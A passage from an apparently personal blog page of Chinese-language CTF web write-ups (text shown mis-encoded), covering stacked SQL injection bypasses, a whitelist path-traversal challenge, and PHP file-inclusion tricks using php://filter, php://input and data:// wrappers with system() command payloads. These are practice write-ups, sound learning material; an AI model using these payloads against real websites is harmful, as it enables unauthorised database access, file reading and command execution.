ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œå¯ä»¥ç”¨ä¹‹å‰æ–‡ä»¶åŒ…å«æ—¶å€™å­¦åˆ°çš„phpä¼ªåè®®ï¼Œæ„é€ payloadï¼Œé¡µé¢è¿”å›base64</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php      </code></pre>
<p><img src="images/buu2.1.7.png" alt="1"><br>è§£ç å¾—åˆ°flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">buu-éšä¾¿æ³¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-31 18:20:27" itemprop="dateCreated datePublished" datetime="2021-01-31T18:20:27+08:00">2021-01-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-05 16:56:44" itemprop="dateModified" datetime="2021-03-05T16:56:44+08:00">2021-03-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu-webç¬¬äºŒé¢˜ï¼Œéšä¾¿æ³¨"><a href="#buu-webç¬¬äºŒé¢˜ï¼Œéšä¾¿æ³¨" class="headerlink" title="buu-webç¬¬äºŒé¢˜ï¼Œéšä¾¿æ³¨"></a>buu-webç¬¬äºŒé¢˜ï¼Œéšä¾¿æ³¨</h1><p>é¢˜ç›®å¾ˆåš£å¼ å•Šï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œ1ï¼Œæäº¤å¦‚ä¸‹ï¼Œç»™äº†ä¸€æ®µä»£ç <br><img src="images/buu-sbz1.png" alt="buu-sbz1.png"><br>æ¥ä¸‹æ¥ï¼Œæ ¹æ®å¸¸è§„æ“ä½œï¼Œåˆ¤æ–­å‡ºå­—ç¬¦å‹æ³¨å…¥ï¼Œä¸¤ä¸ªå­—æ®µï¼Œå½“æˆ‘ä»¬å¼€å¿ƒåœ°è¿›è¡Œè”åˆæ³¨å…¥æ—¶ï¼Œå‘ç°<br><img src="images/buu-sbz2.png" alt="buu-sbz1.png"><br>selectè¢«æ³¨é‡Šæ‰äº†ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è”åˆæŸ¥è¯¢æ‰¾flagäº†ï¼Œæ‰€ä»¥è¦ç»•è¿‡selectï¼Œç”¨åˆ«çš„æ–¹æ³•ã€‚<br>çœ‹äº†å¥½å¤šå¤§ä½¬çš„wpï¼Œè¯´å› å¯ä»¥è¾“å…¥å¤šä¸ªè¯­å¥ï¼Œå› æ­¤å¯ä»¥ç”¨å †å æŸ¥è¯¢<br>å…ˆæŸ¥æ•°æ®åº“ï¼ˆæ²¡å•¥ç”¨ï¼‰<br><img src="images/buu-sbz3.png" alt="buu-sbz1.png"><br>æŸ¥è¡¨å¦‚ä¸‹ï¼Œæœ‰ä¸¤ä¸ª<br><img src="images/buu-sbz4.png" alt="buu-sbz1.png"><br>å†æŸ¥è¡¨ä¸­çš„åˆ—å¦‚ä¸‹(å­—ç¬¦ä¸²ä¸ºè¡¨åæ“ä½œæ—¶è¦åŠ åå¼•å·)ï¼Œå‘ç°äº†flag<br><img src="images/buu-sbz5.png" alt="buu-sbz1.png">  </p>
<h2 id="æ–¹æ³•1-é¢„ç¼–è¯‘"><a href="#æ–¹æ³•1-é¢„ç¼–è¯‘" class="headerlink" title="æ–¹æ³•1.é¢„ç¼–è¯‘"></a>æ–¹æ³•1.é¢„ç¼–è¯‘</h2><p>flagåœ¨ç¬¬ä¸€ä¸ªè¡¨ä¸­ï¼ŒæŸ¥flagï¼Œselectè¢«è¿‡æ»¤ï¼Œå¤§ä½¬è¯´ç”¨é¢„ç¼–è¯‘çš„æ–¹å¼ç»•è¿‡è¿™ä¸ªè¿‡æ»¤ï¼Œæ„é€      </p>
<pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
`1919810931114514`;&#39;);prepare aaa from @sql;EXECUTE aaa; --+     </code></pre>
<p>å‡ºç°å¦‚ä¸‹å›¾,å‘ç°è¿˜è¿‡æ»¤äº†setå’Œprepare<br><img src="images/buu-sbz6.png" alt="buu-sbz1.png"><br>åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å¤§å°å†™ç»•è¿‡ï¼Œé‡æ–°æ„é€ payloadå¦‚ä¸‹ï¼š     </p>
<pre><code>-1&#39;;Set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
`1919810931114514`;&#39;);Prepare aaa from @sql;EXECUTE aaa; --+</code></pre>
<p>æ¬¢å¤©å–œåœ°ï¼Œå¾—åˆ°flag<br><img src="images/buu-sbz7.png" alt="buu-sbz1.png">    </p>
<hr>
<h2 id="æ–¹æ³•2-handleræŸ¥è¯¢"><a href="#æ–¹æ³•2-handleræŸ¥è¯¢" class="headerlink" title="æ–¹æ³•2.handleræŸ¥è¯¢"></a>æ–¹æ³•2.handleræŸ¥è¯¢</h2><p>mysqlå¯ä»¥ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥æ˜¯ä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚<br>handlerå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚<br>ä½¿ç”¨æ–¹æ³•ï¼š<br>handler table_name openæ‰“å¼€ä¸€å¼ è¡¨<br>handel table_name read firstè¯»å–ç¬¬ä¸€è¡Œå†…å®¹ï¼Œ<br>handel table_name read nextä¾æ¬¡è·å–å…¶å®ƒè¡Œ<br>æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œhandel table_name read nextä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>æ„é€ payloadï¼š</p>
<pre><code>-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#    </code></pre>
<p><img src="images/buu-sbz8.png" alt="buu-sbz1.png"><br>ç®€å•å¿«æ·ï¼Œææ€–å¦‚æ–¯ï¼     </p>
<hr>
<h2 id="æ–¹æ³•3-ä¿®æ”¹è¡¨åå’Œåˆ—å"><a href="#æ–¹æ³•3-ä¿®æ”¹è¡¨åå’Œåˆ—å" class="headerlink" title="æ–¹æ³•3.ä¿®æ”¹è¡¨åå’Œåˆ—å"></a>æ–¹æ³•3.ä¿®æ”¹è¡¨åå’Œåˆ—å</h2><p>ç”±ä¸Šé¢çŸ¥é“flagåœ¨è¡¨â€œ1919810931114514â€ä¸­ï¼ŒæŸ¥è¡¨words<br><img src="images/buu-sbz9.png" alt="buu-sbz1.png"><br>æ ¹æ®ä¸¤ä¸ªè¡¨çš„æƒ…å†µç»“åˆå®é™…æŸ¥è¯¢å‡ºç»“æœçš„æƒ…å†µåˆ¤æ–­å‡ºwordsæ˜¯é»˜è®¤æŸ¥è¯¢çš„è¡¨ï¼Œå› ä¸ºæŸ¥è¯¢å‡ºçš„ç»“æœæ˜¯ä¸€ä¸ªæ•°å­—åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œwordsè¡¨ç»“æ„æ˜¯idå’Œdataï¼Œä¼ å…¥çš„injectå‚æ•°ä¹Ÿå°±æ˜¯èµ‹å€¼ç»™äº†idï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°æ®åº“ä¿®æ”¹è¡¨åå’Œåˆ—åçš„æ–¹æ³•ï¼Œå°†æˆ‘ä»¬è¦æŸ¥è¯¢çš„è¡¨åæ”¹æˆç¬¬äºŒä¸ªï¼Œå°±å¯ä»¥æŸ¥è¯¢å‡ºæƒ³è¦çš„å†…å®¹äº†<br>æ“ä½œå¦‚ä¸‹ï¼š<br>alter table words rename to aaa;å…ˆæŠŠåŸæ¥çš„wordsè¡¨åå­—æ”¹æˆå…¶ä»–<br>alter table 1919810931114514 rename to words;å°†è¡¨1919810931114514çš„åå­—æ”¹ä¸ºwords<br>alter table words change flag id varchar(100);å°†æ”¹å®Œåå­—åçš„è¡¨ä¸­çš„flagæ”¹ä¸ºidï¼Œå­—ç¬¦ä¸²å°½é‡é•¿ç‚¹<br>æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>
<p>ç„¶åæˆ‘ä»¬ç”¨1â€™ or 1=1 â€“+ç›´æ¥å°±èƒ½å¾—åˆ°  </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-Warmup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/31/buu-Warmup/" class="post-title-link" itemprop="url">buu-Warmup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-01-31 17:28:53 / Modified: 18:19:47" itemprop="dateCreated datePublished" datetime="2021-01-31T17:28:53+08:00">2021-01-31</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="æ ¹æ®é¢˜ç›®å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼Œå¼€å§‹ä»£ç å®¡è®¡"><a href="#æ ¹æ®é¢˜ç›®å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼Œå¼€å§‹ä»£ç å®¡è®¡" class="headerlink" title="æ ¹æ®é¢˜ç›®å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼Œå¼€å§‹ä»£ç å®¡è®¡"></a>æ ¹æ®é¢˜ç›®å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼Œå¼€å§‹ä»£ç å®¡è®¡</h2><pre><code>&lt;?php
    highlight_file(__FILE__);
class emmm
&#123;
    public static function checkFile(&amp;$page)
    &#123;
        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
        //å¾—åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶hint.phpï¼ŒåŒ…å«å¾—åˆ°flagçš„æ–‡ä»¶å

        //isset()åˆ¤æ–­å˜é‡æ˜¯å¦å£°æ˜ï¼Œis_string()åˆ¤æ–­å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²
        if (! isset($page) || !is_string($page)) &#123;
            echo &quot;you can&#39;t see it&quot;;
            return false;
        &#125;

        //æ£€æµ‹ä¼ è¿›æ¥çš„å€¼æ˜¯å¦åŒ¹é…ç™½åå•åˆ—è¡¨$whitelist å¦‚æœæœ‰åˆ™æ‰§è¡ŒçœŸ
        if (in_array($page, $whitelist)) &#123;            
            return true;
        &#125;

        //è¿‡æ»¤é—®å·çš„å‡½æ•°(å¦‚æœ$pageçš„å€¼æœ‰ï¼Ÿåˆ™ä»?ä¹‹å‰æå–å­—ç¬¦ä¸²)
        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
        );

        //ç¬¬äºŒæ¬¡æ£€æµ‹ä¼ è¿›æ¥çš„å€¼æ˜¯å¦åŒ¹é…ç™½åå•åˆ—è¡¨$whitelist
        if (in_array($_page, $whitelist)) &#123;
            return true;
        &#125;

        //å¯¹$pageè¿›è¡Œurlè§£ç 
        $_page = urldecode($page);

         //ç¬¬äºŒæ¬¡è¿‡æ»¤é—®å·çš„å‡½æ•°(å¦‚æœ$pageçš„å€¼æœ‰ï¼Ÿåˆ™ä»?ä¹‹å‰æå–å­—ç¬¦ä¸²)
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
        );

        //ç¬¬ä¸‰æ¬¡æ£€æµ‹ä¼ è¿›æ¥çš„å€¼æ˜¯å¦åŒ¹é…ç™½åå•åˆ—è¡¨$whitelist
        if (in_array($_page, $whitelist)) &#123;
            return true;
        &#125;

        //è‹¥ä»¥ä¸Šéƒ½æ²¡é€šè¿‡ï¼Œåˆ™è¿”å›false
        echo &quot;you can&#39;t see it&quot;;
        return false;
    &#125;
&#125;

//---------------------------------------------------------------
//è¿™é‡Œå°±åˆ°äº†æ–‡ä»¶åŒ…å«ï¼Œéœ€è¦ä¼ å…¥çš„å‚æ•°fileä¸ä¸ºç©ºä¸”æ˜¯å­—ç¬¦ä¸²ï¼Œç»è¿‡class emmmçš„æ£€æµ‹ï¼Œå³emmmè¿”å›çœŸï¼Œåˆ™åŒ…å«file    
if (! empty($_REQUEST[&#39;file&#39;])
    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
) &#123;
    include $_REQUEST[&#39;file&#39;];
    exit;
&#125; else &#123;
    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
&#125;  
?&gt;</code></pre>
<hr>
<p>è§‚å¯Ÿæºç å‘ç°hint.phpï¼Œæ‰“å¼€å‘ç°<br>flag not here, and flag in ffffllllaaaagggg<br>å¦‚æœæ»¡è¶³ç›¸åº”çš„æ¡ä»¶ï¼Œincludeå¼•å…¥æ–‡ä»¶ã€‚åªéœ€ä½¿emmm::checkFile($_REQUEST[â€˜fileâ€™]è¿”å›å€¼ä¸ºtrueï¼Œåˆ©ç”¨../è·³è½¬ç›®å½•è¯»å–flagå³å¯ã€‚<br>payloadä¸ºï¼šfile=source.php?/../ffffllllaaaaggggï¼Œç»è¿‡mb_strposä¸ºsource.php?/../ffffllllaaaagggg?,  ä½†æ˜¯mb_strposè¿™ä¸ªå‡½æ•°åªè¿”å›é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šè¿”å›ç¬¬ä¸€ä¸ªï¼Ÿçš„ä½ç½®ï¼Œè€Œmb_substræˆªå–å‡½æ•°ï¼Œä»0å¼€å§‹æˆªå–ä¸€ç›´åˆ°ç¬¬ä¸€ä¸ªï¼Ÿçš„ä½ç½®ï¼Œæˆªå–å†…å®¹ä¸ºsource.phpï¼Œæ°å¥½èƒ½ä¸ç™½åå•ä¸­çš„è¿›è¡ŒåŒ¹é…ï¼Œå¯ä»¥return true;ï¼Œæ‰€ä»¥é€šè¿‡ç¬¬ä¸€æ¬¡æˆªå–è¿›è¡Œç»•è¿‡<br>ffffllllaaaaggggæ–‡ä»¶å’Œindex.phpä¸åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ‰€ä»¥è¯»å–çš„æ˜¯ä¸Šçº§ç›®å½•ã€‚æ„é€ payload <a target="_blank" rel="noopener" href="http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg%EF%BC%8C%E6%89%BE%E5%88%B0flag%EF%BC%88%E5%88%A9%E7%94%A8/%E4%BD%BFsource.php?%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9C%80%E5%90%8Einclude%E5%88%A9%E7%94%A8../%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96flag%E5%8D%B3%E5%8F%AF%EF%BC%89">http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaaggggï¼Œæ‰¾åˆ°flagï¼ˆåˆ©ç”¨/ä½¿source.php?æˆä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œæœ€åincludeåˆ©ç”¨../è·³è½¬ç›®å½•è¯»å–flagå³å¯ï¼‰</a>  </p>
<ul>
<li>æ³¨æ„ï¼š../ æœ‰å¤šå°‘ä¸ªä¸ä¸€å®šï¼Œå› ä¸ºä¸çŸ¥é“flagåœ¨åº•å‡ å±‚ç›®å½•é‡Œï¼Œéœ€è¦ä»æ²¡æœ‰å¼€å§‹ä¸€æ¬¡åŠ ä¸€ä¸ªå»å°è¯•ã€‚</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">æ–‡ä»¶åŒ…å«</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-16 10:15:37" itemprop="dateCreated datePublished" datetime="2021-01-16T10:15:37+08:00">2021-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-18 18:09:19" itemprop="dateModified" datetime="2021-01-18T18:09:19+08:00">2021-01-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h1><p>åˆšèµ·æ­¥ï¼Œé‡åˆ°ä¸¤ä¸ª æ–‡ä»¶åŒ…å« çš„é¢˜ç›®<br>å…ˆé™„ä¸ŠCSDNçœ‹åˆ°çš„å…³äºæ–‡ä»¶åŒ…å«çš„è®²è§£<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/94631028">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>
<h2 id="bugku-6-æ–‡ä»¶åŒ…å«-æœ¬åœ°åŒ…å«"><a href="#bugku-6-æ–‡ä»¶åŒ…å«-æœ¬åœ°åŒ…å«" class="headerlink" title="bugku-6.æ–‡ä»¶åŒ…å«-æœ¬åœ°åŒ…å«"></a>bugku-6.æ–‡ä»¶åŒ…å«-æœ¬åœ°åŒ…å«</h2><p>CSDNå¤§ä½¬è®²è§£ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39431542/article/details/88628225">æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¯¦è§£</a><br>ç¬¬äºŒè¡Œå¯çŸ¥ï¼Œflagåœ¨flag.phpé‡Œï¼Œå€’æ•°ç¬¬äºŒè¡Œshow_source(<strong>FILE</strong>)å¾ˆæ˜æ˜¾çš„æç¤º<br>$_REQUEST[]æ”¯æŒgetã€postä¸¤ç§æ–¹å¼å‘é€è¿‡æ¥çš„è¯·æ±‚ï¼Œå¾ˆæ˜æ˜¾æ¥æ”¶äº†helloå‚æ•°çš„å€¼ï¼Œ<br>var_dump()å‡½æ•° æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ï¼›æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„<br>eval()å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ã€‚è¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ PHP ä»£ç ï¼Œä¸”å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚<br>show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•æ˜¾ç¤º,æ˜¯ highlight_file() çš„åˆ«å</p>
<blockquote>
<p>æœ¬é¢˜ä»£ç å¦‚ä¸‹<br><img src="images/bugku6.1.png" alt="6.1">   </p>
<ul>
<li>å¯ç›´æ¥å°†flag.phpæ–‡ä»¶è¯»å…¥å˜é‡helloä¸­<br>urlè¾“å…¥?hello=file(â€˜flag.phpâ€™)<br><img src="images/bugku6.2.png" alt="6.2">     </li>
<li>evalå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨helloæ„é€ payload<br><code>index.php?hello=1);show_source(%27flag.php%27);var_dump(3</code><br><img src="images/bugku6.3.png" alt="6.3">    </li>
</ul>
</blockquote>
<hr>
<h2 id="bugku-12-æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#bugku-12-æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="bugku-12.æ–‡ä»¶åŒ…å«æ¼æ´"></a>bugku-12.æ–‡ä»¶åŒ…å«æ¼æ´</h2><blockquote>
<p><img src="images/bugku12.0.png" alt="12.0"><br>ç‚¹<br><img src="images/bugku12.1.png" alt="12.1"><br>è§‚å¯Ÿurl : â€œ<a target="_blank" rel="noopener" href="http://114.67.246.176:16465/index.php?file=show.php&quot;%EF%BC%8C%E7%9C%8B%E5%88%B0file%EF%BC%8C%E6%98%8E%E7%99%BD%E8%BF%99%E5%8F%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E8%81%94%E6%83%B3%E5%88%B0">http://114.67.246.176:16465/index.php?file=show.php&quot;ï¼Œçœ‹åˆ°fileï¼Œæ˜ç™½è¿™åˆæ˜¯æ–‡ä»¶åŒ…å«çš„é¢˜ç›®ï¼Œè”æƒ³åˆ°</a><u>è¯»å–indexæ–‡ä»¶ï¼Œä½†æ˜¯ç›´æ¥è¯»å–indexæ— æ³•æŸ¥çœ‹ï¼Œæ‰€ä»¥å°±åº”è¯¥è€ƒè™‘ç”¨base64æ–¹æ³•è¯»å–ï¼Œæ„é€ url</u>.<br>æ„é€ url=â€œ<a target="_blank" rel="noopener" href="http://your/">http://your</a> test ip/index.php?file=php://filter/read=convert.base64-encode/resource=index.phpâ€ , ç½‘é¡µè¿”å›base64.è§£ç å¾—flag<br><img src="images/bugku12.2.png" alt="12.2"> </p>
<ul>
<li>php://æ˜¯ä¸€ç§åè®®åç§°ï¼Œphp://filter/æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ/read=convert.base64-encode/è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯base64ç¼–ç åï¼Œresource=index.phpè¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚  </li>
</ul>
</blockquote>
<hr>
<h2 id="æ”»é˜²ä¸–ç•Œ-Web-php-include"><a href="#æ”»é˜²ä¸–ç•Œ-Web-php-include" class="headerlink" title="æ”»é˜²ä¸–ç•Œ-Web_php_include"></a>æ”»é˜²ä¸–ç•Œ-Web_php_include</h2><p><img src="images/gf3.0.png" alt="3.0"><br>ä»ä»£ç ä¸­å¾—çŸ¥pageä¸­å¸¦æœ‰php://çš„éƒ½ä¼šè¢«æ›¿æ¢æˆç©º<br>    str_replace()ä»¥å…¶ä»–å­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦(åŒºåˆ†å¤§å°å†™)<br>    strstr() æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚è¿”å›å­—ç¬¦ä¸²å‰©ä½™éƒ¨åˆ†    </p>
<blockquote>
<p>æ–¹æ³•ä¸€<br>1.å¯ä»¥åˆ©ç”¨PHPçš„å¤§å°å†™è½¬æ¢ï¼Œåˆ©ç”¨PHP://input         </p>
</blockquote>
<ul>
<li>php://filter<br>#æ‰§è¡Œæ–‡ä»¶<br>page=Php://filter/resource=index.php<br>#è¯»å–æ–‡ä»¶éœ€è¦å°†æ–‡ä»¶åbase64ç¼–ç    page=Php://filter/read=convert.base64-encode/resource=index.php</li>
<li>php://input<br>è¿™ä¸ªåè®®çš„åˆ©ç”¨æ–¹æ³•æ˜¯ å°†è¦æ‰§è¡Œçš„phpä»£ç å†™åœ¨postä¸­æäº¤ï¼Œä¸ç”¨é”®ä¸å€¼çš„å½¢å¼ï¼Œåªå†™ä»£ç å³å¯ã€‚ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;   </span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç”¨burpsuiteåœ¨æŠ¥æ–‡ä¸­åŠ ä¸€å¥è¯æœ¨é©¬<br><img src="images/gf3.1.png" alt="3.1"><br><img src="images/gf3.2.png" alt="3.2">    </p>
</blockquote>
</li>
</ul>
<hr>
<blockquote>
<p>æ–¹æ³•äºŒ dataåè®®    </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data: text&#x2F;plain,&lt;?php æ‰§è¡Œå†…å®¹ ?&gt;   </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class="line">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;  </span><br></pre></td></tr></table></figure>
<p> æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°flag     </p>
<blockquote>
<p>æ–¹æ³•ä¸‰ http://åè®®è¿›è¡Œç»•è¿‡<br>åˆ©ç”¨helloå‚æ•°å°†æ‰§è¡Œå†…å®¹æ˜¾ç¤ºï¼Œflagå¦‚å›¾æ‰€ç¤º</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;?hello&#x3D;&lt;? system(&quot;ls&quot;);?&gt;      </span><br></pre></td></tr></table></figure>
<p><img src="images/gf3.3.png" alt="3.3">   </p>
<pre><code>?page=http://127.0.0.1/index.php/?hello=&lt;? show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;    </code></pre>
<p><img src="images/gf3.4.png" alt="3.4"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
